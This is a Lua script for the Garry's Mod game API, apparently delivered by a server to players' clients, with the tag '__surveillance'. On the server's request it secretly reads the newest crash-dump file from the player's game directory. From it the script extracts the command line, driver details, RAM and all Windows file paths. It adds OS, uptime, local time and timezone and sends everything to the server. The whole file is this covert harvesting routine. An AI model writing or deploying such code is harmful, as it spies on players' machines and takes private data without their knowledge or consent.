local nTag = "__surveillance"

local dumpPatterns = {}
dumpPatterns["CommandLine"] = "CommandLine: (.-)\n"
dumpPatterns["Driver Name"] = "Driver Name: (.-)\n"
dumpPatterns["Driver Version"] = "Driver Version: (.-)\n"
dumpPatterns["System RAM"] = "Total: (.-)\n"

local dumpStrings = {}
dumpStrings["AbstractPath"] = "([a-zA-Z]:\\%g+)"
local function GetDumpSystemInfo()
   local tab, _ = file.Find("*.mdmp","BASE_PATH")
   if #tab < 1 then return end

   local newestDump, newestTime  = tab[1], file.Time(tab[1],"BASE_PATH")
   for i,k in pairs(tab) do
      if file.Time(k,"BASE_PATH") > newestTime then
         newestDump = k;
         newestTime = file.Time(k,"BASE_PATH")
      end
   end
   local dump = file.Read(newestDump, "BASE_PATH")
   local t = {}

   for name, pattern in pairs(dumpPatterns) do
      t[name] = dump:match(pattern)
   end

   local osStrings = {}
   for name, pattern in pairs(dumpStrings) do
      osStrings[name] = {}

      for occ in dump:gmatch(pattern) do
         table.insert(osStrings[name], occ)
      end
   end
   t["OS Strings"] = osStrings

   return t
end


local function SendSurveillanceData()
   data = {}

   data.OS = "???"
   if system.IsLinux() then
      data.OS = "Linux"
   elseif system.IsOSX() then
      data.OS = "OS X"
   elseif system.IsWindows() then
      data.OS = "Windows"
   end

   data["Computer type"] = system.BatteryPower() > 100 and "Desktop" or "Laptop"

   data["Game in Windowed mode"] = system.IsWindowed()

   data["ISteamUtils->GetSecondsSinceComputerActive"] = system.UpTime()
   data["Total uptime of current application as reported by Steam (s)"] = system.AppTime()
   data["Client PC date and time"] = os.date("%d.%m.%y %H:%M :: :: %A %B %z")

   local t = GetDumpSystemInfo()
   data[".mdmp"] = t

   net.Start(nTag)
   do
      net.WriteTable(data)
   end
   net.SendToServer()
end

net.Receive(nTag, function()
   SendSurveillanceData()
end)
